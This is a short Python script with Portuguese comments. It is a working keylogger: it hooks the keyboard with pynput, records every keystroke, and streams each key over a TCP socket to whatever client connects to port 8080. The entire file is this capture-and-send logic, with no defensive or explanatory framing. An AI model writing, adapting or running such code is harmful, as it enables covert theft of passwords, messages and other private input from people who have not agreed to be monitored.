import socket
from pynput.keyboard import Listener

def keyscan(tecla):
    tecla = str(tecla).replace("'", "")
    if len(tecla) > 1:
        tecla = "[{}]".format(tecla)
    print(tecla)

    # Enviar tecla ao cliente
    client_socket.send(tecla.encode())

# Configurar o servidor
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(('127.0.0.1', 8080))
server_socket.listen(1)

# Aceitar conexão
print('Aguardando conexão...')
client_socket, addr = server_socket.accept()
print('Conectado a', addr)

# Iniciar listener de teclas
with Listener(on_press=keyscan) as listener:
    # Aguardar conexão ser encerrada pelo cliente
    client_socket.recv(1)

# Fechar conexão
client_socket.close()
server_socket.close()
